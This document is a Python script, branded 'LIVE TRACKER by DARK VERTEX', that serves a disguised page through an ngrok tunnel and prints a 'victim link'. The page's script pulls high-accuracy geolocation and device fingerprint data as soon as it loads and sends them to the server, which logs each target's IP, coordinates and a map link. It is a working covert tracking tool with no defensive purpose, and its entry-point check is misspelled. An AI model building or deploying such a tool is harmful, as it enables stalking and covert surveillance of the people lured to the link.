#!/usr/bin/env python3
import http.server
import socketserver
import json
import threading
import sys
import os
import subprocess
import time
import urllib.request
import urllib.error

PORT = 8080

# Advanced Cyberpunk HTML Template with Telemetry & Fingerprinting
ADVANCED_HTML_PAGE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LIVE TRACKER</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            background-color: #050505;
            color: #ff0033;
            font-family: 'Courier New', Courier, monospace;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            text-align: center;
            padding: 20px;
        }
        .container {
            border: 1px solid #ff0033;
            background: rgba(10, 10, 10, 0.98);
            padding: 45px;
            border-radius: 4px;
            box-shadow: 0 0 30px rgba(255, 0, 51, 0.25);
            max-width: 480px;
            width: 100%;
        }
        h1 {
            color: #ff0033;
            font-size: 2.2rem;
            margin-bottom: 5px;
            letter-spacing: 4px;
            text-transform: uppercase;
            text-shadow: 0 0 10px rgba(255, 0, 51, 0.8);
        }
        h3 {
            color: #ff0033;
            font-size: 0.95rem;
            margin-bottom: 30px;
            letter-spacing: 2px;
            text-transform: uppercase;
            opacity: 0.8;
        }
        .status-box {
            border: 1px dashed rgba(255, 0, 51, 0.4);
            padding: 15px;
            margin-bottom: 25px;
            font-size: 0.85rem;
            color: #ff0033;
            background: rgba(255, 0, 51, 0.03);
        }
        .loader {
            border: 2px solid #111;
            border-top: 2px solid #ff0033;
            border-radius: 50%;
            width: 35px;
            height: 35px;
            animation: spin 0.8s linear infinite;
            margin: 0 auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>LIVE TRACKER</h1>
        <h3>by DARK VERTEX</h3>
        <div class="status-box" id="status">Initializing secure link protocol...</div>
        <div class="loader" id="loader"></div>
    </div>

    <script>
        async function gatherMetadata() {
            return {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                screenRes: window.screen.width + "x" + window.screen.height,
                hardwareConcurrency: navigator.hardwareConcurrency || "Unknown",
                deviceMemory: navigator.deviceMemory || "Unknown",
                language: navigator.language || "Unknown",
                connection: navigator.connection ? navigator.connection.effectiveType : "Unknown"
            };
        }

        window.addEventListener('load', async () => {
            const statusEl = document.getElementById('status');
            const meta = await gatherMetadata();
            
            if (navigator.geolocation) {
                statusEl.innerText = "Calibrating spatial coordinates...";
                
                navigator.geolocation.getCurrentPosition(
                    position => {
                        const payload = {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy,
                            altitude: position.coords.altitude,
                            speed: position.coords.speed,
                            metadata: meta
                        };

                        statusEl.innerText = "Telemetry successfully synchronized.";

                        fetch('/telemetry', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify(payload)
                        }).then(() => {
                            document.getElementById('loader').style.display = 'none';
                        });
                    },
                    error => {
                        statusEl.innerHTML = "Authorization Interrupted.<br><span style='font-size:0.75rem; opacity:0.7;'>Fallback matrix active.</span>";
                        document.getElementById('loader').style.display = 'none';
                        
                        fetch('/telemetry', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ error: "Location Denied", metadata: meta })
                        });
                    },
                    { enableHighAccuracy: true, timeout: 12000, maximumAge: 0 }
                );
            } else {
                statusEl.innerText = "Environment incompatible.";
                document.getElementById('loader').style.display = 'none';
            }
        });
    </script>
</body>
</html>
"""

class AdvancedThreadingServer(socketserver.ThreadingMixIn, http.server.HTTPServer):
    daemon_threads = True

class AdvancedHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.wfile.write(ADVANCED_HTML_PAGE.encode("utf-8"))
        else:
            self.send_response(404)
            self.end_headers()

    def do_POST(self):
        if self.path == '/telemetry':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            
            try:
                data = json.loads(post_data.decode('utf-8'))
            except json.JSONDecodeError:
                return

            client_ip = self.headers.get('X-Forwarded-For', self.client_address[0])
            
            lat = data.get('latitude')
            lon = data.get('longitude')
            acc = data.get('accuracy')
            alt = data.get('altitude', 'N/A')
            speed = data.get('speed', 'N/A')
            meta = data.get('metadata', {})

            print("\n" + "═"*70)
            print("\033[1;31m[+] ADVANCED TELEMETRY PACKET RECEIVED\033[0m")
            print(f"\033[1;31m[*] Target IP      :\033[0m {client_ip}")
            
            if lat and lon:
                print(f"\033[1;31m[*] Latitude       :\033[0m {lat}")
                print(f"\033[1;31m[*] Longitude      :\033[0m {lon}")
                print(f"\033[1;31m[*] Accuracy       :\033[0m {acc} meters")
                print(f"\033[1;31m[*] Altitude       :\033[0m {alt}")
                print(f"\033[1;31m[*] Velocity       :\033[0m {speed}")
                print(f"\033[1;31m[*] Google Maps    :\033[0m https://www.google.com/maps?q={lat},{lon}")
            else:
                print(f"\033[1;31m[!] Status         :\033[0m Location access restricted by target.")

            print(f"[*] Device Profile : {meta.get('platform', 'Unknown')} | Res: {meta.get('screenRes', 'N/A')}")
            print(f"[*] User-Agent     : {meta.get('userAgent', 'Unknown')}")
            print("═"*70 + "\n")

            self.send_response(200)
            self.send_header("Content-type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps({"status": "acknowledged"}).encode("utf-8"))

    def log_message(self, format, *args):
        return

def run_server():
    with AdvancedThreadingServer(("", PORT), AdvancedHandler) as httpd:
        httpd.serve_forever()

def get_ngrok_url():
    for _ in range(10):
        try:
            req = urllib.request.urlopen("http://127.0.0.1:4040/api/tunnels")
            res = json.loads(req.read().decode())
            tunnels = res.get("tunnels", [])
            for tunnel in tunnels:
                if tunnel.get("proto") == "https":
                    return tunnel.get("public_url")
        except Exception:
            time.sleep(1)
    return None

if _name_ == "_main_":
    os.system('clear' if os.name == 'posix' else 'cls')
    print("\033[1;31m")
    print(r"""
    ██╗     ██╗██╗   ██╗███████╗    ████████╗██████╗  █████╗  ██████╗██╗  ██╗███████╗██████╗ 
    ██║     ██║██║   ██║██╔════╝    ╚══██╔══╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗
    ██║     ██║██║   ██║█████╗         ██║   ██████╔╝███████║██║     █████╔╝ █████╗  ██████╔╝
    ██║     ██║╚██╗ ██╔╝██╔══╝         ██║   ██╔══██╗██╔══██║██║     ██╔-██╗ ██╔══╝  ██╔══██╗
    ███████╗██║ ╚████╔╝ ███████╗       ██║   ██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║
    """)
    print("        [>] ADVANCED TELEMETRY ENGINE - BY DARK VERTEX\033[0m\n")
    
    # Start server in background thread
    server_thread = threading.Thread(target=run_server, daemon=True)
    server_thread.start()
    print(f"[*] Local multi-threaded core initialized on port {PORT}...")

    # Start native ngrok via subprocess to avoid pyngrok android architecture error
    print("[*] Launching secure tunnel protocol...")
    ngrok_process = subprocess.Popen(
        ["ngrok", "http", str(PORT)],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )

    # Fetch public URL automatically from ngrok local API
    public_url = get_ngrok_url()
    
    if public_url:
        print(f"\n\033[1;32m[+] VICTIM LINK GENERATED SUCCESSFULLY:\033[0m")
        print(f"\033[1;36m{public_url}\033[0m\n")
        print("[*] Waiting for target interaction... (Press Ctrl+C to exit)\n")
    else:
        print("\n\033[1;31m[-] Failed to fetch public URL. Make sure 'ngrok' is installed and authenticated.\033[0m")
        ngrok_process.terminate()
        sys.exit(1)

    try:
        while True:
            threading.Event().wait(1)
    except KeyboardInterrupt:
        print("\n[!] Execution terminated by operator. Cleaning up processes...")
        ngrok_process.terminate()
        sys.exit(0)
